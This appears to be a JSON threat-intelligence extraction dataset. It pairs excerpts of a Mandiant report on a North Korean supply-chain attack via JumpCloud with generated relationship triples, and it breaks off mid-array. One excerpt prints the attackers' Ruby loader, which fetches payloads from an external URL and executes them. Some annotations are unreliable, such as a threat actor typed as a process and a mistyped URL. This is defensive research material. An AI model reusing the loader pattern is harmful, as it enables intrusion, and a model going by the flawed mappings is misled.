[
    {
        "phase": "initial access",
        "content": "Initial access was gained by compromising JumpCloud and inserting malicious code into their commands framework. In at least one instance, the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent. The script contained instructions to download and execute a second stage payload. Within 24 hours of gaining \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog initial access to systems in the victim environment, the threat actor deployed additional backdoors and established persistence via plists. The initial payloads and second stage backdoors were removed from the system. \nThe directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading as legitimate files and applications. \nMandiant retrieved the lightweight Ruby script named init.rb  that was deployed to multiple systems: \nrequire 'open-uri'   \nffn $=$ '/usr/local/bin/com.docker.vmnat'   \nFile.open(ffn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nFile.chmod(0755, ffn)   \nfn $=$ '/usr/local/bin/com.docker.vmnat.lock   \nFile.open(fn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nsystem(ffn) \nThe script downloads two files to locations defined by the variables ffn and fn, but only the first file is executed via the system function. The second file could not be identified on the hosts. ",
        "relationship": "1. [CoT]: The text states that the lightweight Ruby script was executed via the JumpCloud agent, indicating a process-to-process relationship where the JumpCloud agent executes the script. [Relationships]: <process:JumpCloud agent,execute,process:lightweight Ruby script>. \n2. [CoT]: The text describes that the Ruby script contained instructions to download and execute a second stage payload, indicating a process-to-file relationship where the Ruby script downloads the second stage payload. [Relationships]: <process:Ruby script,download,file:second stage payload>. \n3. [CoT]: Similar to the first relationship, the Ruby script also contained instructions to execute the second stage payload, indicating another process-to-file relationship where the Ruby script executes the second stage payload. [Relationships]: <process:Ruby script,execute,file:second stage payload>. \n4. [CoT]: The text mentions that the threat actor deployed additional backdoors, indicating a process-to-process relationship where the threat actor deploys the backdoors. [Relationships]: <process:threat actor,deploy,process:additional backdoors>. \n5. [CoT]: The text describes that the threat actor established persistence via plists, indicating a process-to-file relationship where the threat actor establishes persistence via the plists. [Relationships]: <process:threat actor,establish,file:plists>. \n6. [CoT]: The script downloads a file from 'hxxps://primerosauxiliosp', indicating a process-to-socket relationship where the Ruby script downloads from the URL. [Relationships]: <process:Ruby script,download,socket:hxxps://primerosauxiliosp>. \n7. [CoT]: The script writes to a file '/usr/local/bin/com.docker.vmnat', indicating a process-to-file relationship where the Ruby script writes to the file. [Relationships]: <process:Ruby script,write,file:/usr/local/bin/com.docker.vmnat>. \n8. [CoT]: The script writes to another file '/usr/local/bin/com.docker.vmnat.lock', indicating a process-to-file relationship where the Ruby script writes to the lock file. [Relationships]: <process:Ruby script,write,file:/usr/local/bin/com.docker.vmnat.lock>. \n9. [CoT]: The script executes the file '/usr/local/bin/com.docker.vmnat', indicating a process-to-file relationship where the Ruby script executes the file. [Relationships]: <process:Ruby script,execute,file:/usr/local/bin/com.docker.vmnat>. \n10. [CoT]: The script could not be identified on the hosts, so no specific file is mentioned, but it indicates a process-to-socket relationship where the Ruby script downloads from another URL. [Relationships]: <process:Ruby script,download,socket:unknown URL>. ",
        "semantic_relationship": "[CoT]: The original relationship describes a process (JumpCloud agent) executing another process (lightweight Ruby script). In the system-level relationships framework, this directly maps to the 'Fork' relationship between processes. [System-level Relationships]: <process:JumpCloud agent,Fork,process:lightweight Ruby script>. \n[CoT]: The original relationship \"download\" implies that the Ruby script is retrieving and saving the second stage payload to disk, which corresponds to the \"Write\" action in the system-level relationships framework. The payload is being written to a file on the system, hence the conversion to \"Write\". [System-level Relationships]: <process:Ruby script,Write,file:second stage payload>. \n[CoT]: The original relationship describes a process (Ruby script) executing a file (second stage payload), which directly maps to the system-level 'Execute' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Execute,file:second stage payload>. \n[CoT]: The term \"deploy\" in the original relationship implies that the threat actor is injecting or loading the additional backdoors into another process, which aligns with the system-level relationship \"Inject\". This indicates code injection or process injection behavior. [System-level Relationships]: <process:threat actor,Inject,process:additional backdoors>. \n[CoT]: The original relationship describes the threat actor establishing persistence via plists, which involves writing to the plists file. Therefore, the system-level relationship is 'Write' from the process to the file. [System-level Relationships]: <process:threat actor,Write,file:plists>. \n[CoT]: The original relationship describes a download action, which in system-level terms corresponds to a process receiving data from a socket. Therefore, the correct system-level relationship is 'Receive' between the Ruby script process and the socket. [System-level Relationships]: <process:Ruby script,Receive,socket:hxxps://primerosauxilioso>. \n[CoT]: The original relationship describes a Ruby script writing to a file, which directly maps to the system-level 'Write' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat>. \n[CoT]: The original relationship describes a Ruby script writing to a file, which directly maps to the system-level 'Write' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat.lock>. \n[CoT]: The original relationship describes a process (Ruby script) executing a file (/usr/local/bin/com.docker.vmnat). In the system-level relationships framework, this directly maps to the 'Execute' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. \n[CoT]: The original relationship \"download\" implies that the Ruby script is receiving data from a socket (URL), which aligns with the system-level relationship \"Receive\" between a process and a socket. [System-level Relationships]: <process:Ruby script,Receive,socket:unknown URL>. "
    },
    {
        "phase": "execution",
        "content": "The threat actor downloaded and executed   \n/usr/local/bin/com.docker.vmnat  using the aforementioned Ruby script. However,   \ncom.docker.vmnat  was removed from the system. Fortunately, an artifact of its execution was   \ndiscovered in the /private/var/db/oah   \ndirectory. \nBecause com.docker.vmnat was likely compiled for x86-64 systems, the code had to be translated to ARM64 to successfully execute on the target system. As a result, Apple's Rosetta 2 translator produced a com.docker.vmnat.aot  file under the oah directory that included the translated ARM64 code as well as symbols present in the original com.docker.vmnat  application. Based on these symbols, Mandiant assesses with moderate confidence that com.docker.vmnat  was a version of the FULLHOUSE.DOORED backdoor. \nFULLHOUSE.DOORED is a backdoor written in $\\mathsf{C}/\\mathsf{C}++$ that communicates using HTTP. It incorporates the capabilities of the FULLHOUSE tunneler in addition to supporting backdoor commands including shell command execution, file transfer, file management, and process injection. The command and control (C2) server must be configured from either the command line or a configuration file. \nAdditional attacker backdoors identified on systems with names that masquaraded as legitimate binaries and also produced AOT files upon translation (e.g., npx-cli  and npx-cli.aot ). ",
        "relationship": "1. [CoT]: The text states that the Ruby script was used to download and execute /usr/local/bin/com.docker.vmnat, indicating a process-to-file relationship. [Relationships]: <process:Ruby script,downloaded and executed,file:/usr/local/bin/com.docker.vmnat>. \n2. [CoT]: The text mentions that the Ruby script was used to execute /usr/local/bin/com.docker.vmnat, indicating a process-to-process relationship. [Relationships]: <process:Ruby script,executed,process:/usr/local/bin/com.docker.vmnat>. \n3. [CoT]: The text describes that an artifact of execution was discovered in /private/var/db/oah, showing a process-to-file relationship. [Relationships]: <process:com.docker.vmnat,executed,file:/private/var/db/oah>. \n4. [CoT]: The text states that Apple's Rosetta 2 translator produced com.docker.vmnat.aot, indicating a process-to-file relationship. [Relationships]: <process:Apple's Rosetta 2 translator,produced,file:com.docker.vmnat.aot>. \n5. [CoT]: The text mentions that FULLHOUSE.DOORED communicates using HTTP, implying a process-to-socket relationship. [Relationships]: <process:FULLHOUSE.DOORED,communicates,socket:HTTP>. \n6. [CoT]: The text states that the C2 server must be configured, indicating a process-to-socket relationship. [Relationships]: <process:command and control (C2) server,must be configured,socket:server>. ",
        "semantic_relationship": "[CoT]: The original relationship states that the Ruby script \"downloaded and executed\" another file. In system-level terms, downloading a file typically involves writing the file's contents to disk, which corresponds to the \"Write\" relationship between a process and a file. The execution of the file is captured by the \"Execute\" relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat>,<process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. \n[CoT]: The original relationship states that the Ruby script \"executed\" another process, which directly maps to the system-level relationship \"Fork\" between two processes. [System-level Relationships]: <process:Ruby script,Fork,process:/usr/local/bin/com.docker.vmnat>. \n[CoT]: The original relationship indicates that a process (com.docker.vmnat) executed a file (/private/var/db/oah). In system-level terms, this corresponds to the \"Execute\" relationship between a process and a file. [System-level Relationships]: <process:com.docker.vmnat,Execute,file:/private/var/db/oah>. \n[CoT]: The term \"produced\" in the original relationship implies that the process created or generated the file. In system-level terms, this corresponds to a \"Create\" action from a process to a file. [System-level Relationships]: <process:Apple's Rosetta 2 translator,Create,file:com.docker.vmnat.aot>. \n[CoT]: The original relationship \"communicates\" implies that the process FULLHOUSE.DOORED is establishing a connection to the socket (HTTP). In system-level terms, this is best represented as a \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:FULLHOUSE.DOORED,Connect,socket:HTTP>. \n[CoT]: The original relationship states that the C2 server \"must be configured\", which implies the process needs to establish a connection to the socket (server). In system-level terms, this is best represented as a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:command and control (C2) server,Connect,socket:server>. "
    },
    {
        "phase": "command and control",
        "content": "Limited forensic evidence existed to determine exactly how STRATOFEAR was deployed to systems in the victim environment; however, in each instance, STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED. On the systems analyzed, only one backdoor remained on the system, indicating the threat actor may have used FULLHOUSE.DOORED as a first-stage backdoor before deploying STRATOFEAR as a second-stage backdoor. \nSTRATOFEAR is a modular backdoor that communicates with C2 servers using a protocol specified in its C2 configuration, which is decrypted from a local file. The backdoor's primary functionality involves retrieving and executing additional modules. Modules may be downloaded from a remote server or loaded from disk. \nSTRATOFEAR contains an embedded configuration that includes two file paths. The first path ( /Library/Fonts/ArialUnicode.ttf.md5 ) stores the backdoor's full configuration, including its C2 servers. The second path \n( /Library/Fonts/ArialUnicode.ttf.md5.1 ) may be used to store logging information related to monitor activity that is described as follows. \nA portion of STRATOFEAR's 0x1052-byte decrypted configuration is shown as follows. \nSTRATOFEAR refers to the four-byte value at offset 0x410 ( 0x16325 ) as a uid. The four-byte value at offset $0\\times416$ ( 0x3e8  or decimal 1000 ) is the backdoor's version number. STRATOFEAR's configuration file may include AES-128-encrypted modules; however, this was not the case in the discovered sample. \nA subset of commands supported by STRATOFEAR are listed in the following table: \nSystem information collected using command 0x07 includes the system name, current username, and the system's architecture. \nSTRATOFEAR supports the module-related commands listed in the following table: \nDownloaded modules may be written to a .tmp  file in the $\\$1$ TMPDIR  or /tmp  directory. The file's name consists of six randomly-generated alphanumeric characters. \nSTRATOFEAR's code references five predefined module types that have an ID value and an internal name: \nSTRATOFEAR also contains strings that are used to report a module's location. Possible locations are Config \", \" Static \", or \" Path \" followed by a file path. \nSTRATOFEAR  employs what it refers to as \"monitors\" to monitor system activity using up to 16 threads. The backdoor references eight different monitors and includes descriptions for all but one $(\\theta\\times45)$ . \nMandiant directly observed one (1) variant of STRATOFEAR as a Mach-O executable compiled for ARM64 systems that contained a self-signed certificate with a particular Common Name (CN). Mandiant identified a second sample on VirusTotal with the same self-signed certificate CN. The second sample is a Windows DLL protected using VMProtect that was first submitted to VirusTotal on October 19, 2022. Mandiant assesses with moderate confidence that the DLL is a Windows version of STRATOFEAR. ",
        "relationship": "1. [CoT]: The text states that \"STRATOFEAR was preceded by the deployment of FULLHOUSE.DOORED,\" indicating that FULLHOUSE.DOORED was deployed before STRATOFEAR. [Relationships]: <process:FULLHOUSE.DOORED,deployed,process:STRATOFEAR>. \n2. [CoT]: The text mentions that STRATOFEAR \"communicates with C2 servers using a protocol specified in its C2 configuration,\" showing that STRATOFEAR interacts with C2 servers for communication. [Relationships]: <process:STRATOFEAR,communicates with,socket:C2 servers>. \n3. [CoT]: The text describes that \"modules may be downloaded from a remote server,\" indicating that STRATOFEAR downloads modules from a remote server. [Relationships]: <process:STRATOFEAR,downloads from,socket:remote server>. \n4. [CoT]: The text states that \"modules may be downloaded... or loaded from disk,\" showing that STRATOFEAR loads modules from disk. [Relationships]: <process:STRATOFEAR,loads,file:modules from disk>. \n5. [CoT]: The text mentions that \"The first path (/Library/Fonts/ArialUnicode.ttf.md5) stores the backdoor's full configuration,\" indicating that STRATOFEAR stores its configuration in this file path. [Relationships]: <process:STRATOFEAR,stores,file:/Library/Fonts/ArialUnicode.ttf.md5>. \n6. [CoT]: The text describes that \"The second path (/Library/Fonts/ArialUnicode.ttf.md5.1) may be used to store logging information,\" showing that STRATOFEAR stores logging information in this file path. [Relationships]: <process:STRATOFEAR,stores,file:/Library/Fonts/ArialUnicode.ttf.md5.1>. \n7. [CoT]: The text states that \"Downloaded modules may be written to a .tmp file in the $1$ TMPDIR or /tmp directory,\" indicating that STRATOFEAR writes downloaded modules to .tmp files in specified directories. [Relationships]: <process:STRATOFEAR,writes,file:.tmp files>. \n8. [CoT]: The text mentions that STRATOFEAR's code references \"five predefined module types that have an ID value and an internal name,\" showing that STRATOFEAR references these module types. [Relationships]: <process:STRATOFEAR,references,process:module types>. ",
        "semantic_relationship": "[CoT]: The term \"deployed\" in the original relationship implies that FULLHOUSE.DOORED initiated the creation of STRATOFEAR. In system-level terms, this corresponds to a Fork relationship from FULLHOUSE.DOORED to STRATOFEAR. [System-level Relationships]: <process:FULLHOUSE.DOORED,Fork,process:STRATOFEAR>. \n[CoT]: The original relationship states that STRATOFEAR \"communicates with C2 servers\" using a specified protocol. In system-level terms, this communication implies establishing a connection to the C2 servers, which is best represented by the \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:STRATOFEAR,Connect,socket:C2 servers>. \n[CoT]: The original relationship \"downloads from\" implies that STRATOFEAR receives data from the remote server, which aligns with the system-level relationship \"Receive\" between a process and a socket. [System-level Relationships]: <process:STRATOFEAR,Receive,socket:remote server>. \n[CoT]: The original relationship states that STRATOFEAR loads modules from disk, which directly corresponds to the system-level relationship 'Loadlibrary' between a process and a file. [System-level Relationships]: <process:STRATOFEAR,Loadlibrary,file:modules from disk>. \n[CoT]: The original relationship \"stores\" implies that the process STRATOFEAR is writing data to the file /Library/Fonts/ArialUnicode.ttf.md5, which aligns with the system-level relationship \"Write\" between a process and a file. [System-level Relationships]: <process:STRATOFEAR,Write,file:/Library/Fonts/ArialUnicode.ttf.md5>. \n[CoT]: The original relationship states that STRATOFEAR \"stores\" information in the file, which implies writing data to the file. Therefore, the system-level relationship is \"Write\" from the process to the file. [System-level Relationships]: <process:STRATOFEAR,Write,file:/Library/Fonts/ArialUnicode.ttf.md5.1>. \n[CoT]: The original relationship states that STRATOFEAR \"writes\" to .tmp files, which directly corresponds to the system-level \"Write\" relationship between a process and a file. This indicates that the process is creating or modifying the temporary files in the specified directories. [System-level Relationships]: <process:STRATOFEAR,Write,file:.tmp files>. \n[CoT]: The original relationship \"references\" between STRATOFEAR and the module types implies that STRATOFEAR is loading or incorporating the module types into its process space, which aligns with the system-level relationship \"Loadlibrary\". [System-level Relationships]: <process:STRATOFEAR,Loadlibrary,process:module types>. "
    },
    {
        "phase": "command and control",
        "content": "Limited forensic evidence existed to determine exactly how TIEDYE was deployed to systems in the victim environment; however, like STRATOFEAR, TIEDYE was likely deployed as a second-stage backdoor by FULLHOUSE.DOORED. \nA Mach-O executable named xpc.protect was identified and determined to be an evolution of the TIEDYE backdoor. TIEDYE can communicate with a C2 server using a range of supported protocols described as follows. Its capabilities include retrieving and executing additional payloads, collecting basic system information, and executing shell commands. \nA portion of TIEDYE's raw configuration is shown as follows: \nThe configuration contains two C2 servers that are prefixed with a protocol identifier. TIEDYE supports the following \nprotocols:  tcp ,  tcp6 ,  udp ,  upd6 ,  http , https ,  proxy_socks4 ,  proxy_socks4a ,  pipe , ssl ,  ssl3 , and  rdp . The file path at the end of the configuration is used to store configuration data that is encrypted using AES-128. \nPrevious versions of TIEDYE were configured to persist via a LaunchAgent. The current version contains the functionality to create a LaunchAgent at one of the following locations but is not configured to do so: \n\\$HOME/Library/LaunchAgents/com.studentd.agent.plist /Library/LaunchDaemons/com.studentd.agent.plist \nTIEDYE has similarities to RABBITHUNT, which is a backdoor written in $\\mathsf{C}\\substack{++}$ that communicates via a custom binary protocol over TCP. RABBITHUNT's core functionality is implemented through modules d\uedd9ownloaded directly into memory or read from a local file. Capabilities added via modules include \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog reverse shell, file transfer, process creation, and process termination. ",
        "relationship": "1. [CoT]: The text states that TIEDYE was likely deployed as a second-stage backdoor by FULLHOUSE.DOORED, indicating a process-to-process relationship. [Relationships]: <process:FULLHOUSE.DOORED,deployed,process:TIEDYE>. \n2. [CoT]: The text mentions that TIEDYE can communicate with a C2 server, indicating a process-to-socket relationship. [Relationships]: <process:TIEDYE,communicate with,socket:C2 server>. \n3. [CoT]: The text describes that TIEDYE was configured to persist via a LaunchAgent, indicating a process-to-file relationship. [Relationships]: <process:TIEDYE,persist via,file:LaunchAgent>. \n4. [CoT]: The text states that the current version of TIEDYE contains the functionality to create a LaunchAgent at specific file paths, indicating a process-to-file relationship. [Relationships]: <process:TIEDYE,create,file:LaunchAgents/com.studentd.agent.plist>. \n5. [CoT]: The text mentions another file path where the LaunchAgent can be created, indicating another process-to-file relationship. [Relationships]: <process:TIEDYE,create,file:/Library/LaunchDaemons/com.studentd.agent.plist>. ",
        "semantic_relationship": "[CoT]: The term \"deployed\" in the original relationship implies that FULLHOUSE.DOORED created or spawned the TIEDYE process, which aligns with the system-level \"Fork\" relationship between processes. [System-level Relationships]: <process:FULLHOUSE.DOORED,Fork,process:TIEDYE>. \n[CoT]: The original relationship \"communicate with\" implies that TIEDYE establishes a connection to the C2 server, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:TIEDYE,Connect,socket:C2 server>. \n[CoT]: The original relationship \"persist via\" implies that the process TIEDYE is writing to a file (LaunchAgent) to establish persistence. In system-level terms, this corresponds to a \"Write\" action from a process to a file. [System-level Relationships]: <process:TIEDYE,Write,file:LaunchAgent>. \n[CoT]: The original relationship states that TIEDYE creates a file (LaunchAgent). In system-level terms, this corresponds to a Process-to-File 'Create' action, as the process is generating a new file on the system. [System-level Relationships]: <process:TIEDYE,Create,file:LaunchAgents/com.studentd.agent.plist>. \n[CoT]: The original relationship states that the process \"TIEDYE\" creates a file at \"/Library/LaunchDaemons/com.studentd.agent.plist\". In system-level terms, this corresponds to the \"Create\" action between a process and a file. The action \"create\" in the original relationship directly maps to the system-level relationship \"Create\". [System-level Relationships]: <process:TIEDYE,Create,file:/Library/LaunchDaemons/com.studentd.agent.plist>. "
    },
    {
        "phase": "command and control",
        "content": "Mandiant has observed RGB units utilize a series of Operational Relay Boxes (ORBs) using L2TP IPsec tunnels along with commercial VPN providers to \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog obscure their source address. These relays seem to be heavily shared among units under the RGB umbrella. \nMandiant observed UNC4899 utilize various VPN providers as a final hop, the most common being ExpressVPN, but connections to NordVPN, TorGuard and many other providers have also been observed. There have been many occasions in which DPRK threat actors did not employ this last hop, or mistakenly did not utilize this while conducting actions on operations on the victim's network. \nThe VPNs used by RGB actors occasionally fail, which reveals the IP addresses of the actor's true origins. Mandiant observed the DPRK threat actor UNC4899 connecting directly to an attackercontrolled ORB from their 175.45.178[.]0/24 subnet. (Ryugyong Dong, Pyongyang). Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived. Figure 2 provides an overview of the network infrastructure used in this campaign. \nAdditionally, Mandiant was able to uncover additional infrastructure due to the fact that a PTR record was never changed from a previous operation. Mandiant has previously identified the domain wasxxv[.]site being used by North Korean threat actors. Additionally, the IP address 198.244.135[.]250 is being utilized for another C2 domain prontoposer[.]com while still having a PTR record to the domain previously identified. ",
        "relationship": "1. [CoT]: The text mentions that RGB units utilize L2TP IPsec tunnels, indicating a process-to-socket relationship where the process utilizes the L2TP IPsec tunnel. [Relationships]: <process:RGB units, utilize, socket:L2TP IPsec tunnels>. \n2. [CoT]: The text states that Operational Relay Boxes (ORBs) use commercial VPN providers for obfuscation, indicating a process-to-socket relationship where the process uses the commercial VPN providers. [Relationships]: <process:ORBs, utilize, socket:commercial VPN providers>. \n3. [CoT]: The text describes UNC4899 utilizing various VPN providers as a final hop, indicating a process-to-socket relationship where the process utilizes the VPN providers. [Relationships]: <process:UNC4899, utilize, socket:VPN providers>. \n4. [CoT]: The text mentions UNC4899 connecting directly to an attacker-controlled ORB from their subnet, indicating a process-to-socket relationship where the process connects to the ORB. [Relationships]: <process:UNC4899, connect, socket:ORB>. \n5. [CoT]: The text describes the DPRK threat actor logging directly into a Pyongyang IP from one of their jump boxes, indicating a process-to-socket relationship where the process logs into the IP address. [Relationships]: <process:DPRK threat actor, log, socket:Pyongyang IP>. ",
        "semantic_relationship": "[CoT]: The original relationship states that RGB units \"utilize\" L2TP IPsec tunnels, which implies the process is establishing a connection to the socket. In system-level terms, this corresponds to a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:RGB units,Connect,socket:L2TP IPsec tunnels>. \n[CoT]: The original relationship \"utilize\" implies that the ORBs are establishing a connection to the commercial VPN providers' sockets to obfuscate their communications. In system-level terms, this maps to a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:ORBs,Connect,socket:commercial VPN providers>. \n[CoT]: The original relationship \"utilize\" implies that UNC4899 is establishing a connection to the VPN providers' sockets to access their services. In system-level terms, this corresponds to a \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:UNC4899,Connect,socket:VPN providers>. \n[CoT]: The original relationship describes a process (UNC4899) connecting to a socket (ORB). In the system-level framework, this maps directly to the 'Connect' relationship between a process and a socket. [System-level Relationships]: <process:UNC4899,Connect,socket:ORB>. \n[CoT]: The original relationship describes the DPRK threat actor logging into a Pyongyang IP, which in system-level terms translates to a Process-to-Socket 'Connect' relationship. This indicates the process is establishing a connection to the socket (IP address). [System-level Relationships]: <process:DPRK threat actor,Connect,socket:Pyongyang IP>. "
    },
    {
        "phase_relationship": [
            {
                "phase": "initial access",
                "relationship": "[Description]: The text states that the lightweight Ruby script was executed via the JumpCloud agent, indicating a process-to-process relationship where the JumpCloud agent executes the script. [Original Relationships]: <process:JumpCloud agent,execute,process:lightweight Ruby script>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (JumpCloud agent) executing another process (lightweight Ruby script). In the system-level relationships framework, this directly maps to the 'Fork' relationship between processes. [System-level Relationships]: <process:JumpCloud agent,Fork,process:lightweight Ruby script>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The text describes that the Ruby script contained instructions to download and execute a second stage payload, indicating a process-to-file relationship where the Ruby script downloads the second stage payload. [Original Relationships]: <process:Ruby script,download,file:second stage payload>. ",
                "semantic_relationship": "[CoT]: The original relationship \"download\" implies that the Ruby script is retrieving and saving the second stage payload to disk, which corresponds to the \"Write\" action in the system-level relationships framework. The payload is being written to a file on the system, hence the conversion to \"Write\". [System-level Relationships]: <process:Ruby script,Write,file:second stage payload>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: Similar to the first relationship, the Ruby script also contained instructions to execute the second stage payload, indicating another process-to-file relationship where the Ruby script executes the second stage payload. [Original Relationships]: <process:Ruby script,execute,file:second stage payload>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (Ruby script) executing a file (second stage payload), which directly maps to the system-level 'Execute' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Execute,file:second stage payload>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The text mentions that the threat actor deployed additional backdoors, indicating a process-to-process relationship where the threat actor deploys the backdoors. [Original Relationships]: <process:threat actor,deploy,process:additional backdoors>. ",
                "semantic_relationship": "[CoT]: The term \"deploy\" in the original relationship implies that the threat actor is injecting or loading the additional backdoors into another process, which aligns with the system-level relationship \"Inject\". This indicates code injection or process injection behavior. [System-level Relationships]: <process:threat actor,Inject,process:additional backdoors>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The text describes that the threat actor established persistence via plists, indicating a process-to-file relationship where the threat actor establishes persistence via the plists. [Original Relationships]: <process:threat actor,establish,file:plists>. ",
                "semantic_relationship": "[CoT]: The original relationship describes the threat actor establishing persistence via plists, which involves writing to the plists file. Therefore, the system-level relationship is 'Write' from the process to the file. [System-level Relationships]: <process:threat actor,Write,file:plists>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The script downloads a file from 'hxxps://primerosauxiliosp', indicating a process-to-socket relationship where the Ruby script downloads from the URL. [Original Relationships]: <process:Ruby script,download,socket:hxxps://primerosauxiliosp>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a download action, which in system-level terms corresponds to a process receiving data from a socket. Therefore, the correct system-level relationship is 'Receive' between the Ruby script process and the socket. [System-level Relationships]: <process:Ruby script,Receive,socket:hxxps://primerosauxilioso>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The script writes to a file '/usr/local/bin/com.docker.vmnat', indicating a process-to-file relationship where the Ruby script writes to the file. [Original Relationships]: <process:Ruby script,write,file:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a Ruby script writing to a file, which directly maps to the system-level 'Write' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The script writes to another file '/usr/local/bin/com.docker.vmnat.lock', indicating a process-to-file relationship where the Ruby script writes to the lock file. [Original Relationships]: <process:Ruby script,write,file:/usr/local/bin/com.docker.vmnat.lock>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a Ruby script writing to a file, which directly maps to the system-level 'Write' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat.lock>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The script executes the file '/usr/local/bin/com.docker.vmnat', indicating a process-to-file relationship where the Ruby script executes the file. [Original Relationships]: <process:Ruby script,execute,file:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (Ruby script) executing a file (/usr/local/bin/com.docker.vmnat). In the system-level relationships framework, this directly maps to the 'Execute' relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "initial access",
                "relationship": "[Description]: The script could not be identified on the hosts, so no specific file is mentioned, but it indicates a process-to-socket relationship where the Ruby script downloads from another URL. [Original Relationships]: <process:Ruby script,download,socket:unknown URL>. ",
                "semantic_relationship": "[CoT]: The original relationship \"download\" implies that the Ruby script is receiving data from a socket (URL), which aligns with the system-level relationship \"Receive\" between a process and a socket. [System-level Relationships]: <process:Ruby script,Receive,socket:unknown URL>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the Ruby script was used to download and execute /usr/local/bin/com.docker.vmnat, indicating a process-to-file relationship. [Original Relationships]: <process:Ruby script,downloaded and executed,file:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the Ruby script \"downloaded and executed\" another file. In system-level terms, downloading a file typically involves writing the file's contents to disk, which corresponds to the \"Write\" relationship between a process and a file. The execution of the file is captured by the \"Execute\" relationship between a process and a file. [System-level Relationships]: <process:Ruby script,Write,file:/usr/local/bin/com.docker.vmnat>,<process:Ruby script,Execute,file:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that the Ruby script was used to execute /usr/local/bin/com.docker.vmnat, indicating a process-to-process relationship. [Original Relationships]: <process:Ruby script,executed,process:/usr/local/bin/com.docker.vmnat>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the Ruby script \"executed\" another process, which directly maps to the system-level relationship \"Fork\" between two processes. [System-level Relationships]: <process:Ruby script,Fork,process:/usr/local/bin/com.docker.vmnat>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text describes that an artifact of execution was discovered in /private/var/db/oah, showing a process-to-file relationship. [Original Relationships]: <process:com.docker.vmnat,executed,file:/private/var/db/oah>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that a process (com.docker.vmnat) executed a file (/private/var/db/oah). In system-level terms, this corresponds to the \"Execute\" relationship between a process and a file. [System-level Relationships]: <process:com.docker.vmnat,Execute,file:/private/var/db/oah>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that Apple's Rosetta 2 translator produced com.docker.vmnat.aot, indicating a process-to-file relationship. [Original Relationships]: <process:Apple's Rosetta 2 translator,produced,file:com.docker.vmnat.aot>. ",
                "semantic_relationship": "[CoT]: The term \"produced\" in the original relationship implies that the process created or generated the file. In system-level terms, this corresponds to a \"Create\" action from a process to a file. [System-level Relationships]: <process:Apple's Rosetta 2 translator,Create,file:com.docker.vmnat.aot>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text mentions that FULLHOUSE.DOORED communicates using HTTP, implying a process-to-socket relationship. [Original Relationships]: <process:FULLHOUSE.DOORED,communicates,socket:HTTP>. ",
                "semantic_relationship": "[CoT]: The original relationship \"communicates\" implies that the process FULLHOUSE.DOORED is establishing a connection to the socket (HTTP). In system-level terms, this is best represented as a \"Connect\" relationship between a process and a socket. [System-level Relationships]: <process:FULLHOUSE.DOORED,Connect,socket:HTTP>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the C2 server must be configured, indicating a process-to-socket relationship. [Original Relationships]: <process:command and control (C2) server,must be configured,socket:server>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the C2 server \"must be configured\", which implies the process needs to establish a connection to the socket (server). In system-level terms, this is best represented as a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:command and control (C2) server,Connect,socket:server>. "
            },
            {
                "phase": "command and control",
